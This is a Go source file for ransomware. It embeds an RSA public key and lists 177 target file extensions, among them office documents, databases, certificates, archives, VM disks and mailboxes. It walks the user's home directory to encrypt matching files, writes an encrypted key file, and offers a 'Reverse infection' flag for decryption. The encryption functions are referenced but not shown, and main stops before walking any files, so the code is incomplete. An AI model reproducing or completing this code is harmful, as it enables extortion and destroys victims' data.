package main

import (
	_ "embed"
	"fmt"
	"io/fs"
	"io/ioutil"
	"os"
	"strings"

	"github.com/spf13/pflag"
)

//go:embed rsaPub.txt
var assymKeyPub []byte

var decryptedKey []byte
var symKey []byte

var Extensions = [177]string{
	"der", "pfx", "key", "crt", "csr", "p12", "pem", "odt", "ott", "sxw", "stw", "uot", "3ds",
	"max", "3dm", "ods", "ots", "sxc", "stc", "dif", "slk", "wb2", "odp", "otp", "sxd", "std",
	"uop", "odg", "otg", "sxm", "mml", "lay", "lay6", "asc", "sqlite3", "sqlitedb", "sql", "accdb",
	"mdb", "db", "dbf", "odb", "frm", "myd", "myi", "ibd", "mdf", "ldf", "sln", "suo", "cs", "c",
	"cpp", "pas", "h", "asm", "js", "cmd", "bat", "ps1", "vbs", "vb", "pl", "dip", "dch", "sch",
	"brd", "jsp", "php", "asp", "rb", "java", "jar", "class", "sh", "mp3", "wav", "swf", "fla",
	"wmv", "mpg", "vob", "mpeg", "asf", "avi", "mov", "mp4", "3gp", "mkv", "3g2", "flv", "wma",
	"mid", "m3u", "m4u", "djvu", "svg", "ai", "psd", "nef", "tiff", "tif", "cgm", "raw", "gif",
	"png", "bmp", "vcd", "iso", "backup", "zip", "rar", "7z", "gz", "tgz", "tar", "bak", "tbk",
	"bz2", "PAQ", "ARC", "aes", "gpg", "vmx", "vmdk", "vdi", "sldm", "sldx", "sti", "sxi", "602",
	"hwp", "edb", "potm", "potx", "ppam", "ppsx", "ppsm", "pps", "pot", "pptm", "xltm", "xltx",
	"xlc", "xlm", "xlw", "xlsb", "xlsm", "dotx", "dotm", "dot", "docm", "docb", "jpg", "jpeg",
	"snt", "onetoc2", "dwg", "pdf", "wkl", "wks", "123", "rtf", "csv", "txt", "vsdx", "vsd", "eml",
	"msg", "ost", "pst", "pptx", "ppt", "xlsx", "xls", "docx", "doc",
}

func checkFilesRev(path string, d fs.DirEntry, err error) error {
	if err != nil {
		return err
	}
	if d.IsDir() {
		return nil
	}
	if !strings.HasSuffix(path, ".ft") {
		return nil
	}
	if err := decryptFiles(decryptedKey, path); err != nil {
		return err
	}
	return nil
}

func writeEncryptedKey(encryptedSymKey []byte) error {
	if err := ioutil.WriteFile("encryptedKey.txt", encryptedSymKey, 0777); err != nil {
		return err
	}
	return nil
}

func checkFiles(path string, d fs.DirEntry, err error) error {
	if err != nil {
		return err
	}
	if strings.HasSuffix(path, ".ft") {
		return nil
	}
	if d.IsDir() {
		return nil
	}
	for i := 0; i < len(Extensions); i++ {
		if !strings.HasSuffix(d.Name(), Extensions[i]) {
			continue
		} else {
			var file []byte
			var err error
			if file, err = os.ReadFile(path); err != nil {
				return err
			}
			if err := encryptFiles(file, path); err != nil {
				return err
			}
			break
		}
	}
	return nil
}

func main() {
	r := pflag.StringP("reverse", "r", "", "Reverse infection")
	pflag.Parse()
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Printf("Error %v\n", err)
		return
	}
}
